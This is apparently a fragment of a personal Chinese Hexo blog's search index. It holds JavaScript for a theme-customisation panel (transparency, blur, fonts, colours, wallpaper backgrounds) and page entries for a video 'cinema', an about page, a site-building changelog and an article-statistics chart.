--trans-dark: rgba(25, 25, 25, ${curTransNum}%) !important} `;function setTrans() {  var elem = document.getElementById("transSet");  var newTransNum = elem.value;  var target = document.querySelector('.transValue');  target.innerHTML = "透明度 (0%-100%): " + newTransNum + "%";  localStorage.setItem("transNum", newTransNum);  curTransMini = newTransNum * 0.95;  curTransNum = newTransNum;  document.querySelector('#rang_trans').style.width = curTransMini + "%";  document.getElementById("transPercent").innerText = `:root{--trans-light: rgba(253, 253, 253, ${newTransNum}%) !important; --trans-dark: rgba(25, 25, 25, ${newTransNum}%) !important} `;};if (localStorage.getItem("blurRad") == undefined) {  localStorage.setItem("blurRad", 20);}var curBlur = localStorage.getItem("blurRad");var miniBlur = curBlur * 0.95;document.getElementById("blurNum").innerText = `:root{--blur-num: blur(${curBlur}px) saturate(120%) !important`;function setBlurNum() {  var elem = document.getElementById("blurSet");  var newBlur = elem.value;  var target = document.querySelector('.blurValue');  target.innerHTML = "模糊半径 (开启模糊生效 0px-100px): " + newBlur + "px";  localStorage.setItem("blurRad", newBlur);  curBlur = newBlur;  miniBlur = curBlur * 0.95;  // var max = elem.getAttribute("max");  document.querySelector('#rang_blur').style.width = miniBlur + "%";  document.getElementById("blurNum").innerText = `:root{--blur-num: blur(${curBlur}px) saturate(120%) !important`;};if (localStorage.getItem("blur") == undefined) {  localStorage.setItem("blur", 1);}if (localStorage.getItem("blur") == 0) {  document.getElementById("settingStyle").innerText = `:root{--backdrop-filter: none}`;} else {  document.getElementById("settingStyle").innerText = `:root{--backdrop-filter: var(--blur-num)}`;}function setBlur() {  if (document.getElementById("blur").checked) {    localStorage.setItem("blur", 1);    document.getElementById("settingStyle").innerText = `:root{--backdrop-filter: var(--blur-num)}`;  } else {    localStorage.setItem("blur", 0);    document.getElementById("settingStyle").innerText = `:root{--backdrop-filter: none}`;  }}var defineColor = localStorage.getItem("blogbg") && localStorage.getItem("blogbg").charAt(0) == '#' ? localStorage.getItem("blogbg") : '#F4D88A';function changeBgColor() {  changeBg(document.querySelector("#define_colors").value);}let bingDayBg = screen.width <= 768 ? "url(https://bing.img.run/m.php)" : "url(https://bing.img.run/1920x1080.php)";let bingHistoryBg = screen.width <= 768 ? "url(https://bing.img.run/rand_m.php)" : "url(https://bing.img.run/rand.php)";let EEEDog = "url(https://api.yimian.xyz/img?type=moe&size=1920x1080)";let seovx = "url(https://cdn.seovx.com/?mom=302)";let picsum = "url(https://picsum.photos/1920/1080.webp)";let waiBizhi = "url(https://api.ixiaowai.cn/gqapi/gqapi.php)";let btstu = "url(http://api.btstu.cn/sjbz/?lx=suiji)";let unsplash = "url(https://source.unsplash.com/random/1920x1080/)";if (localStorage.getItem("blogbg") != undefined) {  setBg(localStorage.getItem("blogbg"));} else {  document.getElementById("defineBg").innerText = `:root{    --default-bg: url(/assets/cover/homecover1.png);    --darkmode-bg: url(/assets/cover/darkcover2.jpg);    --mobileday-bg: url(/assets/cover/phone-cover7.jpg);    --mobilenight-bg: url(/assets/cover/phone-cover1.jpg);  }`;}function changeBg(s) {  defineColor = s.charAt(0) == "#" ? s : '#F4D88A';  setBg(s);  localStorage.setItem("blogbg", s);}function setBg(s) {  document.getElementById("defineBg").innerText = `:root{    --default-bg: ${s};    --darkmode-bg: ${s};    --mobileday-bg: ${s};    --mobilenight-bg: ${s};  }`;}function getPicture() {  debounce(getPicture_, 300);}function getPicture_() {  checkImgExists(document.getElementById("pic-link").value).then(() => {    var link = "url(" + document.getElementById("pic-link").value + ")";    changeBg(link);    new Vue({      data: function () {        this.$notify({          title: "可以啦🍨",          message: "切换自定义背景成功！",          position: 'top-left',          offset: 50,          showClose: true,          type: "success",          duration: 5000        });      }    })  }).catch(() => {    new Vue({      data: function () {        this.$notify({          title: "链接不对🤣",          message: "请输入有效的图片链接！",          position: 'top-left',          offset: 50,          showClose: true,          type: "warning",          duration: 5000        });      }    })  })}function checkImgExists(imgurl) {  return new Promise(function (resolve, reject) {    var ImgObj = new Image();    ImgObj.src = imgurl;    ImgObj.onload = function (res) {      resolve(res);    }    ImgObj.onerror = function (err) {      reject(err);    }  })}if (localStorage.getItem("light") == undefined) {  localStorage.setItem("light", "true");}document.addEventListener('pjax:complete', function () {  changeLight(localStorage.getItem("light") == "true" ? true : false)});document.addEventListener('DOMContentLoaded', function () {  changeLight(localStorage.getItem("light") == "true" ? true : false)});function setLight() {  if (document.getElementById("lightSet").checked) {    changeLight(true);    localStorage.setItem("light", "true");  } else {    changeLight(false);    localStorage.setItem("light", "false");  }}function changeLight(flag) {  if (document.getElementById("site-name"))    document.getElementById("site-name").style.animation = flag ? "light_15px 10s linear infinite" : "none";  if (document.getElementById("site-title"))    document.getElementById("site-title").style.animation = flag ? "light_15px 10s linear infinite" : "none";  if (document.getElementById("site-subtitle"))    document.getElementById("site-subtitle").style.animation = flag ? "light_10px 10s linear infinite" : "none";  if (document.getElementById("post-info"))    document.getElementById("post-info").style.animation = flag ? "light_5px 10s linear infinite" : "none";  document.getElementById("menu_shadow").innerText = flag ? `:root{--menu-shadow: 0 0 1px var(--theme-color);}` : `:root{--menu-shadow: none;}`;}var winbox = "";function createWinbox() {  let div = document.createElement("div");  document.body.appendChild(div);  winbox = WinBox({    id: "meihuaBox",    index: 99,    title: "美化设置",    x: "left",    y: "center",    minwidth: "300px",    height: "60%",    // "#76c8f1"    background: 'var(--theme-color)',    onmaximize: () => {      div.innerHTML = `<style>body::-webkit-scrollbar {display: none;} div#meihuaBox {width: 100% !important;}</style>`;    },    onrestore: () => {      div.innerHTML = "";    },  });  winResize();  window.addEventListener("resize", winResize);/*   背景设置中的一些其他标签：<h3>1. 二次元</h3><details class="folding-tag" cyan><summary> 查看二次元背景 </summary>              <div class='content'>              <div class="bgbox"><a href="javascript:;" rel="noopener external nofollow" style="background-image:url(https://lskypro.acozycotage.net/Fomalhaut/img/home_bg.webp)" class="imgbox" onclick="changeBg('url(https://lskypro.acozycotage.net/Fomalhaut/img/home_bg.webp)')"></a></div>              </div>            </details><h3>2. 风景</h3><details class="folding-tag" cyan><summary> 查看风景背景 </summary>              <div class='content'>              <div class="bgbox"><a href="javascript:;" rel="noopener external nofollow" style="background-image:url(https://lskypro.acozycotage.net/Fomalhaut/img/fj1.webp)" class="imgbox" onclick="changeBg('url(https://lskypro.acozycotage.net/Fomalhaut/img/fj1.webp)')"></a></div>              </div>            </details><h3>3. 萌宠</h3><details class="folding-tag" cyan><summary> 查看萌宠背景 </summary>              <div class='content'>              <div class="bgbox"><a href="javascript:;" rel="noopener external nofollow" style="background-image:url(https://lskypro.acozycotage.net/Fomalhaut/img/mc1.webp)" class="imgbox" onclick="changeBg('url(https://lskypro.acozycotage.net/Fomalhaut/img/mc1.webp)')"></a></div>              </div>            </details>*/  winbox.body.innerHTML = `<div class="settings" style="display: block;"><div id="article-container" style="padding:12px;"><br><center><p><button onclick="reset()" style="background:linear-gradient(to right, #fc354c, #0abfbc);display:block;width:40%;padding:15px 0;border-radius:30px;color:white;font-size:1.1em;"><i class="fa-solid fa-arrows-rotate"></i>&nbsp;恢复默认设置</button></p></center><h2>一、显示偏好</h2><div class="transValue" style="font-weight:bold;padding-left:10px">透明度 (0%-100%): ${curTransNum}%</div><div class="range">  <input id="transSet" type="range" min="0" max="100" step="1" value=${curTransNum} oninput="setTrans()">  <p class="rang_width" id="rang_trans" style="width:${curTransMini}%"></p></div><div class="blurValue" style="font-weight:bold;padding-left:10px">模糊半径 (开启模糊生效 0px-100px): ${curBlur} px</div><div class="range">  <input id="blurSet" type="range" min="0" max="100" step="1" value="${curBlur}" oninput="setBlurNum()">  <p class="rang_width" id="rang_blur" style="width:${miniBlur}%"></p></div><div class="content" style="display:flex">  <div class="content-text" style="font-weight:bold; padding-left:10px"> 星空特效 (夜间模式) </div><input type="checkbox" id="universeSet" onclick="setUniverse()">  <div class="content-text" style="font-weight:bold; padding-left:20px"> 霓虹灯 (夜间模式) </div><input type="checkbox" id="lightSet" onclick="setLight()"></div><div class="content" style="display:flex">  <div class="content-text" style="font-weight:bold; padding-left:10px"> 模糊效果 (消耗性能) </div><input type="checkbox" id="blur" onclick="setBlur()">  <div class="content-text" style="font-weight:bold; padding-left:20px"> 侧边栏 (默认开) </div><input type="checkbox" id="rightSideSet" onclick="toggleRightside()"></div><div class="content" style="display:flex">  <div class="content-text" style="font-weight:bold; padding-left:10px"> 帧率监测 (刷新生效) </div><input type="checkbox" id="fpson" onclick="fpssw()">  <div class="content-text" style="font-weight:bold; padding-left:10px"> 雪花特效 (白天模式) </div><input type="checkbox" id="snowSet" onclick="setSnow()"></div><h2>二、字体设置</h2><div class="note warning modern"><p>非商免字体未经授权只能个人使用。本站为完全非商业、非盈利性质的网站，平时用于个人学习交流，如有侵权请联系站长删除，谢谢！ —— 致版权方</p></div><p id="swfs"><a class="swf" id="swf_ZhuZiAWan" href="javascript:;" rel="noopener external nofollow" style="font-family:'ZhuZiAWan'!important;color:black" onclick="setFont('ZhuZiAWan')">筑紫A丸标准体2.0</a><a class="swf" id="swf_HYTMR" href="javascript:;" rel="noopener external nofollow" style="font-family:'HYTMR'!important;color:black" onclick="setFont('HYTMR')">汉仪唐美人</a><a class="swf" id="swf_LXGW" href="javascript:;" rel="noopener external nofollow" style="font-family:'LXGW'!important;color:black" onclick="setFont('LXGW')">霞鹜文楷</a><a class="swf" id="swf_TTQHB" href="javascript:;" rel="noopener external nofollow" style="font-family:'TTQHB'!important;color:black" onclick="setFont('TTQHB')">甜甜圈海报</a><a class="swf" id="swf_YSHST" href="javascript:;" rel="noopener external nofollow" style="font-family:'YSHST'!important;color:black" onclick="setFont('YSHST')">优设好身体</a><a class="swf" id="swf_MiSans" href="javascript:;" rel="noopener external nofollow" style="font-family:'MiSans'!important;color:black" onclick="setFont('MiSans')">MiSans</a><a class="swf" id="swf_default" href="javascript:;" rel="noopener external nofollow" style="font-family:-apple-system, IBM Plex Mono ,monosapce,'微软雅黑', sans-serif;!important;color:black" onclick="setFont('default')">系统默认</a></p><h2>三、主题色设置</h2><div class="content" style="display:flex"><input type="radio" id="red" name="colors" value=" "        onclick="setColor('red')"><input type="radio" id="orange" name="colors" value=" "        onclick="setColor('orange')"><input type="radio" id="yellow" name="colors" value=" "        onclick="setColor('yellow')"><input type="radio" id="green" name="colors" value=" "        onclick="setColor('green')"><input type="radio" id="blue" name="colors" value=" "        onclick="setColor('blue')"><input type="radio" id="heoblue" name="colors" value=" "        onclick="setColor('heoblue')"><input type="radio" id="darkblue" name="colors" value=" "        onclick="setColor('darkblue')"><input type="radio" id="purple" name="colors" value=" "        onclick="setColor('purple')"><input type="radio" id="pink" name="colors" value=" "        onclick="setColor('pink')" checked="checked"><input type="radio" id="black" name="colors" value=" "        onclick="setColor('black')"><input type="radio" id="blackgray" name="colors" value=" "        onclick="setColor('blackgray')"></div><h2>四、背景设置</h2><center><button onclick="resetBg()" style="background:var(--theme-color);display:block;width:35%;padding:15px 0;border-radius:30px;color:white;"><i class="fa-solid fa-arrows-rotate"></i>&nbsp;恢复默认背景</button></center><h3>1. 渐变色</h3><details class="folding-tag" cyan><summary> 查看渐变色背景 </summary>              <div class='content'>              <div class="bgbox"><a href="javascript:;" rel="noopener external nofollow" class="box" style="background: linear-gradient(to right, #544a7d, #ffd452)" onclick="changeBg('linear-gradient(to right, #544a7d, #ffd452)')"></a><a href="javascript:;" rel="noopener external nofollow" class="box" style="background: linear-gradient(to bottom, #7f7fd5, #86a8e7, #91eae4)" onclick="changeBg('linear-gradient(to bottom, #7f7fd5, #86a8e7, #91eae4)')"></a><a href="javascript:;" rel="noopener external nofollow" class="box" style="background: linear-gradient(to left, #654ea3, #eaafc8)" onclick="changeBg('linear-gradient(to left, #654ea3, #eaafc8)')"></a><a href="javascript:;" rel="noopener external nofollow" class="box" style="background: linear-gradient(to top, #feac5e, #c779d0, #4bc0c8)" onclick="changeBg('linear-gradient(to top, #feac5e, #c779d0, #4bc0c8)')"></a><a href="javascript:;" rel="noopener external nofollow" class="box" style="background: linear-gradient(to top, #d3959b, #bfe6ba)" onclick="changeBg('linear-gradient(to top, #d3959b, #bfe6ba)')"></a><a href="javascript:;" rel="noopener external nofollow" class="box" style="background: linear-gradient(to top, #8360c3, #2ebf91)" onclick="changeBg('linear-gradient(to top, #8360c3, #2ebf91)')"></a><a href="javascript:;" rel="noopener external nofollow" class="box" style="background: linear-gradient(to top, #108dc7, #ef8e38)" onclick="changeBg('linear-gradient(to top, #108dc7, #ef8e38)')"></a><a href="javascript:;" rel="noopener external nofollow" class="box" style="background: linear-gradient(to top, #355c7d, #6c5b7b, #c06c84)" onclick="changeBg('linear-gradient(to top, #355c7d, #6c5b7b, #c06c84)')"></a></div>              </div>            </details><h3>2. 纯色</h3><details class="folding-tag" cyan><summary> 查看纯色背景 </summary>              <div class='content'>              <div class="bgbox"><a href="javascript:;" rel="noopener external nofollow" class="box" style="background: #ecb1b1" onclick="changeBg('#ecb1b1')"></a> <a href="javascript:;" rel="noopener external nofollow" class="box" style="background: #d3ebac" onclick="changeBg('#d3ebac')"></a> <a href="javascript:;" rel="noopener external nofollow" class="box" style="background: #ace9ce" onclick="changeBg('#ace9ce')"></a><a href="javascript:;" rel="noopener external nofollow" class="box" style="background: #c1ebea" onclick="changeBg('#c1ebea')"></a> <a href="javascript:;" rel="noopener external nofollow" class="box" style="background: #dee7f1" onclick="changeBg('#dee7f1')"></a> <a href="javascript:;" rel="noopener external nofollow" class="box" style="background: #e9e3f2" onclick="changeBg('#e9e3f2')"></a> <a href="javascript:;" rel="noopener external nofollow" class="box" style="background: #f7eff5" onclick="changeBg('#f7eff5')"></a>  <input type="color" id="define_colors" href="javascript:;" rel="noopener external nofollow" class="box" autocomplete="on" value="${defineColor}" oninput="changeBgColor()"></input></div>              </div>            </details><h3>3. 适配手机</h3><details class="folding-tag" cyan><summary> 查看适配手机的背景 </summary>              <div class='content'>              <div class="bgbox"><a href="javascript:;" rel="noopener external nofollow" style="background-image:url(https://lskypro.acozycotage.net/Fomalhaut/img/mb4.webp)" class="pimgbox" onclick="changeBg('url(https://lskypro.acozycotage.net/Fomalhaut/img/mb4.webp)')"></a><a href="javascript:;" rel="noopener external nofollow" style="background-image:url(/assets/cover/phone-cover1.jpg)" class="pimgbox" onclick="changeBg('url(/assets/cover/phone-cover1.jpg)')"></a><a href="javascript:;" rel="noopener external nofollow" style="background-image:url(/assets/cover/phone-cover2.jpg)" class="pimgbox" onclick="changeBg('url(/assets/cover/phone-cover2.jpg)')"></a><a href="javascript:;" rel="noopener external nofollow" style="background-image:url(/assets/cover/phone-cover3.jpg)" class="pimgbox" onclick="changeBg('url(/assets/cover/phone-cover3.jpg)')"></a><a href="javascript:;" rel="noopener external nofollow" style="background-image:url(/assets/cover/phone-cover4.jpg)" class="pimgbox" onclick="changeBg('url(/assets/cover/phone-cover4.jpg)')"></a><a href="javascript:;" rel="noopener external nofollow" style="background-image:url(/assets/cover/phone-cover5.jpg)" class="pimgbox" onclick="changeBg('url(/assets/cover/phone-cover5.jpg)')"></a><a href="javascript:;" rel="noopener external nofollow" style="background-image:url(/assets/cover/phone-cover6.jpg)" class="pimgbox" onclick="changeBg('url(/assets/cover/phone-cover6.jpg)')"></a><a href="javascript:;" rel="noopener external nofollow" style="background-image:url(/assets/cover/phone-cover7.jpg)" class="pimgbox" onclick="changeBg('url(/assets/cover/phone-cover7.jpg)')"></a><a href="javascript:;" rel="noopener external nofollow" style="background-image:url(/assets/cover/phone-cover8.jpg)" class="pimgbox" onclick="changeBg('url(/assets/cover/phone-cover8.jpg)')"></a><a href="javascript:;" rel="noopener external nofollow" style="background-image:url(/assets/cover/phone-cover9.jpg)" class="pimgbox" onclick="changeBg('url(/assets/cover/phone-cover9.jpg)')"></a></div>              </div>            </details><h3>4. 壁纸API</h3><details class="folding-tag" cyan><summary> 查看壁纸API系列背景 </summary>              <div class='content'>              <div class="bgbox"><a id="bingDayBox" rel="noopener external nofollow" style="background-image: ${bingDayBg}" class="box apiBox" onclick="changeBg('${bingDayBg}')"></a><a id="bingHistoryBox" rel="noopener external nofollow" style="background-image: ${bingHistoryBg}" class="box apiBox" onclick="changeBg('${bingHistoryBg}')"></a><a id="EEEDogBox" rel="noopener external nofollow" style="background-image: ${EEEDog}" class="box apiBox" onclick="changeBg('${EEEDog}')"></a><a id="seovxBox" rel="noopener external nofollow" style="background-image: ${seovx}" class="box apiBox" onclick="changeBg('${seovx}')"></a><a id="picsumBox" rel="noopener external nofollow" style="background-image: ${picsum}" class="box apiBox" onclick="changeBg('${picsum}')"></a><a id="waiBizhiBox" rel="noopener external nofollow" style="background-image: ${waiBizhi}" class="box apiBox" onclick="changeBg('${waiBizhi}')"></a><a id="btstuBox" rel="noopener external nofollow" style="background-image: ${btstu}" class="box apiBox" onclick="changeBg('${btstu}')"></a><a id="unsplashBox" rel="noopener external nofollow" style="background-image: ${unsplash}" class="box apiBox" onclick="changeBg('${unsplash}')"></a></div>              </div>            </details><h3>5. 自定义背景</h3><details class="folding-tag" cyan><summary> 设置自定义背景 </summary>              <div class='content'>              <p><center><input type="text" id="pic-link" size="70%" maxlength="1000" placeholder="请输入有效的图片链接，如 https://source.fomal.cc/img/home_bg.webp"></center></p><p><center><button type="button" onclick="getPicture()" style="background:var(--theme-color);width:35%;padding: 5px 0px 7px 0px;border-radius:30px;color:white;line-height:2;">🌈切换背景🌈</button></center></p>              </div>            </details><h3>6. 作者推荐</h3><details class="folding-tag" cyan><summary> 查看作者推荐背景 </summary>              <div class='content'>              <div class="bgbox"><a href="javascript:;" rel="noopener external nofollow" class="box" style="background-image:url(/assets/cover/homecover2.png)" class="pimgbox" onclick="changeBg('url(/assets/cover/homecover2.png)')"></a><a href="javascript:;" rel="noopener external nofollow" class="box" style="background-image:url(/assets/cover/homecover3.jpg)" class="pimgbox" onclick="changeBg('url(/assets/cover/homecover3.jpg)')"></a><a href="javascript:;" rel="noopener external nofollow" class="box" style="background-image:url(/assets/cover/darkcover2.jpg)" class="pimgbox" onclick="changeBg('url(/assets/cover/darkcover2.jpg)')"></a><a href="javascript:;" rel="noopener external nofollow" class="box" style="background-image:url(/assets/cover/darkcover1.jpg)" class="pimgbox" onclick="changeBg('url(/assets/cover/darkcover1.jpg)')"></a><a href="javascript:;" rel="noopener external nofollow" class="box" style="background-image:url(/assets/cover/darkcover3.jpg)" class="pimgbox" onclick="changeBg('url(/assets/cover/darkcover3.jpg)')"></a></div>              </div>            </details><br><center><div style="font-size:1.2em;color:var(--theme-color);font-weight:bold;">------ ( •̀ ω •́ )y 到底啦 ------</div></center><br></div></div>`;  $("#" + localStorage.getItem("themeColor")).attr("checked", true);  if (localStorage.getItem("blur") == 1) {    document.getElementById("blur").checked = true;  } else {    document.getElementById("blur").checked = false;  }  if (localStorage.getItem("universe") == "block") {    document.getElementById("universeSet").checked = true;  } else if (localStorage.getItem("universe") == "none") {    document.getElementById("universeSet").checked = false;  }  if (localStorage.getItem("fpson") == "1") {    document.getElementById("fpson").checked = true;  } else {    document.getElementById("fpson").checked = false;  }  if (localStorage.getItem("rs") == "block") {    document.getElementById("rightSideSet").checked = true;  } else if (localStorage.getItem("rs") == "none") {    document.getElementById("rightSideSet").checked = false;  }  if (localStorage.getItem("light") == "true") {    document.getElementById("lightSet").checked = true;  } else {    document.getElementById("lightSet").checked = false;  }  setFontBorder();  if (localStorage.getItem("snow") == "block") {    document.getElementById("snowSet").checked = true;  } else if (localStorage.getItem("snow") == "none") {    document.getElementById("snowSet").checked = false;  }}function resetBg() {  localStorage.removeItem('blogbg');  reload();}function reset() {  clearItem();  reload();}function winResize() {  try {    var offsetWid = document.documentElement.clientWidth;    if (offsetWid <= 768) {      winbox.resize(offsetWid * 0.95 + "px", "90%").move("center", "center");    } else {      winbox.resize(offsetWid * 0.6 + "px", "70%").move("center", "center");    }  } catch (err) {    // console.log("Pjax毒瘤抽风运行winResize方法🙄🙄🙄");  }}function toggleWinbox() {  if (document.querySelector("#meihuaBox")) {    winbox.toggleClass("hide");  } else {    createWinbox();  };}let newYearTimer = null;var newYear = () => {  clearTimeout(newYearTimer);  if (!document.querySelector('#newYear')) return;  let newYear = new Date('2023-01-22 00:00:00').getTime() / 1000,    week = { 0: '周日', 1: '周一', 2: '周二', 3: '周三', 4: '周四', 5: '周五', 6: '周六' }  time();  function nol(h) { return h > 9 ? h : '0' + h; };  function time() {    let now = new Date();    document.querySelector('#newYear .today').innerHTML = now.getFullYear() + '-' + (now.getMonth() + 1) + '-' + now.getDate() + ' ' + week[now.getDay()]    let second = newYear - Math.round(now.getTime() / 1000);    if (second < 0) {      document.querySelector('#newYear .title').innerHTML = 'Happy New Year!';      document.querySelector('#newYear .newYear-time').innerHTML = '<span class="happyNewYear">新年快乐</p>';    } else {      document.querySelector('#newYear .title').innerHTML = '距离2023年春节：'      if (second > 86400) {        document.querySelector('#newYear .newYear-time').innerHTML = `<span class="day">${Math.ceil(second / 86400)}<span class="unit">天</span></span>`      } else {        let h = nol(parseInt(second / 3600));        second %= 3600;        let m = nol(parseInt(second / 60));        second %= 60;        let s = nol(second);        document.querySelector('#newYear .newYear-time').innerHTML = `<span class="time">${h}:${m}:${s}</span></span>`;        newYearTimer = setTimeout(time, 1000);      }    }  }  jQuery(document).ready(function ($) {    $('#newYear').wpSuperSnow({      flakes: ['https://tuchuang.voooe.cn/images/2023/01/02/yb1.webp', 'https://tuchuang.voooe.cn/images/2023/01/02/yb2.webp', 'https://tuchuang.voooe.cn/images/2023/01/02/yb3.webp'],      totalFlakes: '100',      zIndex: '999999',      maxSize: '30',      maxDuration: '20',      useFlakeTrans: false    });  });}document.addEventListener('pjax:complete', newYear);document.addEventListener('DOMContentLoaded', newYear);document.onkeydown = function (e) {  if (123 == e.keyCode || (e.ctrlKey && e.shiftKey && (74 === e.keyCode || 73 === e.keyCode || 67 === e.keyCode)) || (e.ctrlKey && 85 === e.keyCode)) return btf.snackbarShow("你真坏，不能打开控制台喔!"), event.keyCode = 0, event.returnValue = !1, !1};]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>影院</title>
      <link href="/life/movies/index.html"/>
      <url>/life/movies/index.html</url>
      
        <content type="html"><![CDATA[<main class="layout" id="content-inner">    <div id="page">        <div id="article-container">            <span class="p center logo h2 blue">                <b>( ＾∀＾）／欢迎光临影院，切换黑夜模式食用效果更佳哦~!＼( ＾∀＾）</b>            </span>    <br>    <br></main>    <details class="folding-tag" blue>    <summary>哔哩哔哩放映厅</summary>        <div class="content">            <div class="tabs" id="room_1">                <ul class="nav-tabs">                    <li class="tab active">                        <button type="button" data-href="#room_1-1">1号厅</button>                    </li>                    <li class="tab">                        <button type="button" data-href="#room_1-2">2号厅</button>                    </li>                    <li class="tab">                        <button type="button" data-href="#room_1-3">3号厅</button>                    </li>                </ul>                <div class="tab-contents">                    <div class="tab-item-content active" id="room_1-1">                        <h3 id="您当前正处于-1-号厅，当前放映的是《冲破黑暗 Out of Darkness》">您当前正处于 1 号厅，当前放映的是《冲破黑暗 Out of Darkness》</h3>                        <div align="center" class="aspect-ratio">                            <iframe src="//player.bilibili.com/player.html?isOutside=true&aid=714997425&bvid=BV1hX4y1g7pp&cid=321134107&p=1&autoplay=0" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true"></iframe>                        </div>                        <button type="button" class="tab-to-top" aria-label="scroll to top">                            <i class="fas fa-arrow-up"></i>                        </button>                    </div>                    <div class="tab-item-content" id="room_1-2">                        <h3 id="您当前正处于-2-号厅，当前放映的是《记忆管理局》">您当前正处于 2 号厅，当前放映的是《记忆管理局》</h3>                        <div align="center" class="aspect-ratio">                            <iframe src="//player.bilibili.com/player.html?isOutside=true&aid=884758835&bvid=BV1iK4y187Th&cid=240382860&p=1&autoplay=0" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true"></iframe>                        </div>                        <button type="button" class="tab-to-top" aria-label="scroll to top">                            <i class="fas fa-arrow-up"></i>                        </button>                    </div>                    <div class="tab-item-content" id="room_1-3">                        <h3 id="您当前正处于-3-号厅，当前放映的是《黑盒》">您当前正处于 3 号厅，当前放映的是《黑盒》</h3>                        <div align="center" class="aspect-ratio">                            <iframe src="//player.bilibili.com/player.html?isOutside=true&aid=58854830&bvid=BV1Pt411L7Uo&cid=102606378&p=1&autoplay=0" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true"></iframe>                        </div>                        <button type="button" class="tab-to-top" aria-label="scroll to top">                            <i class="fas fa-arrow-up"></i>                        </button>                    </div>                    </div>                      </div>        </div></details>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>画廊</title>
      <link href="/box/gallery/index.html"/>
      <url>/box/gallery/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>网址导航</title>
      <link href="/box/nav/index.html"/>
      <url>/box/nav/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>关于</title>
      <link href="/personal/about/index.html"/>
      <url>/personal/about/index.html</url>
      
        <content type="html"><![CDATA[<ul>    <li style="color: blueviolet">本站为个人博客，采用hexo的butterfly主题架构，结合网上开源代码进行魔改而成。如有侵权，请联系首页本人QQ进行删除</li>    <li style="color: blueviolet">本站内容主要涉及个人学习、知识的分享，欢迎各位读者与我交流。</li>    <li style="color: blueviolet">本站不进行任何盈利目的，所有内容均为原创，如有转载，请注明出处。</li></ul>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>网站建设</title>
      <link href="/site/time/index.html"/>
      <url>/site/time/index.html</url>
      
        <content type="html"><![CDATA[<main class="layout" id="content-inner">    <div id="page">        <div id="article-container">            <span class="p center logo h2 blue">                <b>( ＾∀＾）／关于小站的建设进程都在这里哦~!＼( ＾∀＾）</b>            </span>    <br>    <br></main><details class="folding-tag" blue>    <summary>2024.11.29</summary>    <p style="color: black;">        网站基本框架建设完毕，小站处于调试阶段！    </p></details><details class="folding-tag" blue>    <summary>2024.11.30</summary>        <p style="color: black;">1. 上传文章，并完成基本的排版！</p>        <p style="color: black;">2. 增添文章统计功能，插入文章统计图表！</p>        <p style="color: black;">3. 更改网站背景图，更换文章封面！</p></details><details class="folding-tag" blue>    <summary>2024.12.01</summary>        <p style="color: black;">1. 完成网站的评论功能！</p>        <p style="color: black;">2. 增加首页的标签冰贴</p>        <p style="color: black;">3. 更换头像以及预加载头像动画！</p></details><details class="folding-tag" blue>    <summary>2024.12.02</summary>        <p style="color: black;">1. 完善网站的一些细节，增加格言等文案</p>        <p style="color: black;">2. 进行手机适配设置，让手机用户访问网站更加舒适！</p>        <p style="color: black;">3. 增加文章的评论功能！</p></details><details class="folding-tag" blue>    <summary>2024.12.03</summary>        <p style="color: black;">1. 完成网站的网站地图功能！</p>        <p style="color: black;">2. 注册百度站长和ping站长账号，做好推送准备</p>        <p style="color: black;">3. 修改美化设置，将默认设置修改成了站长喜好！</p></details><details class="folding-tag" blue>    <summary>2024.12.04</summary>        <p style="color: black;">1. 完成网站的大部分建设</p>        <p style="color: black;">2. 增加“八音盒”功能，能从网易云音乐索引音乐播放</p>        <p style="color: black;">3. 实现全局音乐播放，在左下角固定音乐播放器，能实现背景音乐播放（但还是没有当背景音乐播放，考虑到可能会吵到读者）</p>        <p style="color: black;">4. 增加“影院”功能，牵引哔哩哔哩等链接，进行视频观看（都是站长亲自选定的）！</p>        <p style="color: black;">5. 增加根据地理位置欢迎的语句，并不断调试，最终正式上线！</p>        <p style="color: black;">6. 页脚增加标签、格言等！</p>        <p style="color: black;">7. 注册了两个域名（m3x1.cn和m3x1.fun），并实现绑定！</p>        <p>            <span style="color: blue;">至此，网站正式上线！</span>        </p></details><details class="folding-tag" blue>    <summary>2024.12.05</summary>        <p>            <span style="color: blue;">1. 网站“旧时光”功能搭建，开始记录网站建设的历程！</span>        </p>        <p style="color: black;">2. 解决打开影院功能时，视频播放器全部自动播放的问题！</p></details><details class="folding-tag" blue>    <summary>2025.01.16</summary>        <p>            <span style="color: blue;">1. 网站“恋爱小屋”功能搭建，开始记录我和女朋友的故事！</span>        </p>        <p style="color: black;">2. 优化一些细节，修复夜晚模式下看不到“网站建设”内容的问题</p>        <p style="color: black;">3. 增加“关于”页面的内容</p></details><details class="folding-tag" blue>    <summary>2025.02.04</summary>        <p style="color: black;">修复网站重大bug，修复无法显示背景和页脚汉字等问题，修复无法使用美化设置的问题。</p></details><details class="folding-tag" blue>    <summary>2025.02.05</summary>        <p style="color: black;">1.强化网站美化，增加一些推荐壁纸和文章封面图片</p>        <p style="color: black;">2.增加侧边栏新年倒计时</p></details><details class="folding-tag" blue>    <summary>2025.02.08</summary>        <p style="color: black;">优化网站代码，加快网站的运行速度，加强部署</p></details>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>文章统计</title>
      <link href="/site/echarts/index.html"/>
      <url>/site/echarts/index.html</url>
      
        <content type="html"><![CDATA[<script src="https://npm.elemecdn.com/echarts@4.9.0/dist/echarts.min.js"></script><!-- 文章发布时间统计图 --><div id="posts-chart" data-start="2021-01" style="border-radius: 8px; height: 300px; padding: 10px;"></div><!-- 文章标签统计图 --><div id="tags-chart" data-length="10" style="border-radius: 8px; height: 300px; padding: 10px;"></div><!-- 文章分类统计图 --><div id="categories-chart" data-parent="true" style="border-radius: 8px; height: 300px; padding: 10px;"></div>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>八音盒</title>
      <link href="/life/music/index.html"/>
      <url>/life/music/index.html</url>
      
